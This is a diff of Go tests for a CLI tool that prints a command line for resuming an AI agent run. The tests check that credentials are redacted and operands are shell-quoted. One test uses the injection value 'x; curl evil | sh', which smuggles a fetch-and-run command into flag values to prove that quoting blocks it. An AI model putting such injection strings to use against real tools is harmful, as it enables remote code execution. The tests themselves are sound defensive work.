@@ -397,34 +397,88 @@ func assertSinglePrefsAgent(t *testing.T, defs []config.PersonalAgent) {
 }
 
 // TestReentryKeepsAgentArguments pins that the re-entry line carries the
-// arguments after `--`, quoted as --print quotes argv, after --json: a line
-// without them names a different invocation, which --resume refuses.
+// arguments after `--` after --json, by the launch display's rule: the model
+// and budget options it can show survive, every other argument is redacted,
+// and the line says to re-supply them.
 func TestReentryKeepsAgentArguments(t *testing.T) {
 	r, _, _ := testRunner()
 	parsed, _, done := parseFlags(r, []string{
 		"--agent", "claude", "--resume", "--",
-		"--permission-mode", "acceptEdits", "--append-system-prompt", "it's fine",
+		"--model", "opus", "--max-turns", "12", "--permission-mode", "acceptEdits",
 	})
 	if done {
 		t.Fatalf("parsed=%+v", parsed)
 	}
-	want := `verdict run acme/app 42 --resume --agent claude --json -- ` +
-		`--permission-mode acceptEdits --append-system-prompt 'it'\''s fine'`
-	if got := rentry(testReq(), &parsed, true); got != want {
-		t.Fatalf("re-entry = %s; want %s", got, want)
+	want := `verdict run acme/app 42 --resume --agent claude --json -- --model opus --max-turns 12 ` +
+		`'***REDACTED***' '***REDACTED***'  # replace each '***REDACTED***' with the agent argument you passed`
+	if got := reentry(testReq(), &parsed, true, parsed.resume, nil); got != want {
+		t.Fatalf("re-entry = %s\nwant       %s", got, want)
 	}
 }
 
-// TestReentryRedactsCredentialArguments proves the agent arguments reach the
-// re-entry line through the launch record's credential rule: a secret-shaped
-// flag's operand and an argument equal to a secret-named environment value are
-// redacted, and an ordinary argument survives.
-func TestReentryRedactsCredentialArguments(t *testing.T) {
+// TestReentryNeverPrintsCredentials proves no credential an agent argument
+// carries reaches the re-entry line: a bearer header and a cookie, which no
+// secret-named flag announces, are redacted with the rest, and a token shape
+// hiding in an option the display would show is scrubbed from the line.
+func TestReentryNeverPrintsCredentials(t *testing.T) {
 	t.Parallel()
-	pass := []string{"--api-key", "plain-value", "--model", "opus", "sk-ant-0123456789"}
-	got := passTail(pass, []string{"ANTHROPIC_API_KEY=sk-ant-0123456789"})
-	if want := ` -- --api-key '***REDACTED***' --model opus '***REDACTED***'`; got != want {
-		t.Fatalf("pass tail = %s; want %s", got, want)
+	const opaque = "opaque-session-9f8e7d6c5b4a"
+	const token = "ghp_0123456789abcdefghijABCDEFGHIJ0123456789"
+	for name, tc := range map[string]struct {
+		secret string
+		pass   []string
+	}{
+		"bearer header": {opaque, []string{"--header", "Authorization: Bearer " + opaque}},
+		"cookie":        {opaque, []string{"--cookie", "sid=" + opaque}},
+		"token shape":   {token, []string{"--model", token}},
+	} {
+		f := &flags{agent: "claude", timeout: DefaultTimeoutS, rounds: DefaultRounds, pass: tc.pass}
+		got := reentry(testReq(), f, false, false, nil)
+		if strings.Contains(got, tc.secret) || !strings.HasPrefix(got, "verdict run acme/app 42 --agent claude -- ") {
+			t.Errorf("%s: re-entry = %s, want the credential redacted", name, got)
+		}
+	}
+}
+
+// TestReentryResumesBeforeTheSeparator proves the re-entry line for an
+// execution the refusal says to continue carries --resume among verdict's own
+// flags, before `--`, where the shell hands it to verdict rather than the
+// agent.
+func TestReentryResumesBeforeTheSeparator(t *testing.T) {
+	t.Parallel()
+	f := &flags{agent: "agy", timeout: DefaultTimeoutS, rounds: DefaultRounds, pass: []string{"--dangerously-skip-permissions"}}
+	want := `verdict run acme/app 42 --resume --agent agy -- '***REDACTED***'` +
+		`  # replace each '***REDACTED***' with the agent argument you passed`
+	if got := reentry(testReq(), f, false, true, nil); got != want {
+		t.Fatalf("re-entry = %s\nwant       %s", got, want)
+	}
+}
+
+// TestReentryQuotesEveryOperand proves every value flag the line repeats is
+// quoted, so a pasted line runs verdict with the operand it was given and
+// never a second command.
+func TestReentryQuotesEveryOperand(t *testing.T) {
+	t.Parallel()
+	const evil = "x; curl evil | sh"
+	const quoted = `'x; curl evil | sh'`
+	for _, tc := range []struct {
+		set  func(f *flags)
+		flag string
+	}{
+		{func(f *flags) { f.agent = evil }, "--agent"},
+		{func(f *flags) { f.recipe = evil }, "--recipe"},
+		{func(f *flags) { f.timeout = evil }, "--timeout"},
+		{func(f *flags) { f.rounds = evil }, "--rounds"},
+		{func(f *flags) { f.stage = evil }, "--stage"},
+		{func(f *flags) { f.finders = evil }, "--finders"},
+		{func(f *flags) { f.budget = evil }, "--budget"},
+	} {
+		f := &flags{timeout: DefaultTimeoutS, rounds: DefaultRounds}
+		tc.set(f)
+		want := "verdict run acme/app 42 " + tc.flag + " " + quoted
+		if got := reentry(testReq(), f, false, false, nil); got != want {
+			t.Errorf("%s: re-entry = %s, want %s", tc.flag, got, want)
+		}
 	}
 }
 
